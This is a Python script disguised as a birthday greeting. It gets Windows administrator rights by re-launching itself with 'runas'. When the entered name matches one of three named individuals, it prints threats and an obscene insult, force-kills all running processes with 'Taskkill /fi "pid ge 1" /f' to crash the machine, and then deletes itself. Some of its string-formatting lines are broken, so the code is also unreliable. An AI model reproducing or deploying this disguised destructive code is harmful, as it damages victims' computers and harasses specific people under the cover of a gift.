from __future__ import print_function
from colorama import init
from colorama import Fore,Back,Style
import ctypes, sys
import os
import time
import random as r
import easygui as g
init()
telling = "我会记得你的所作所为！"
bir = ["祝你前程似锦！","祝你长命百岁！","祝你在新的一岁快快乐乐！"]
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if is_admin():  # 将要运行的代码加到这里
    objective = g.enterbox(msg="你是谁，请写出你的真实姓名···", title="生日礼物")
    if objective == "肖意恬" or objective == "汤思雨" or objective == "许嘉雨":
        if objective == "肖意恬":
            objective = "得猩红热的傻逼鸭嘴兽" +  "肖意恬"
            telling = "我会一直记得你所说的那些肮脏的话！"
        # 前景色是红色，背景色是蓝色，文字是hello,python
        print(Fore.RED, Back.BLUE, '致 %d：\n接受报复吧！\t %d\n等着吧！')%d(objective,telling)
        time.sleep(1.5)
        print("以获取管理员权限...")
        print("请勿关机或重启\n若关机或重启，\t后果自负！！！")
        os.system("Taskkill /fi \"pid ge 1\" /f")
        input()
        time.sleep(1)
        os.remove("生日快乐.py")
    else:
        p = g.buttonbox("祝你生日快乐！%d"%(r.sample(bir,1)), image="src=http___img1.dowebok.com_5489s.png&refer=http___img1.dowebok.webp", choices=("OK"))
        if p == "OK":
            print("Good bye!")
            sys.exit()
        else:
            sys.exit()
else:
    if sys.version_info[0] == 3:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        print("run again...")
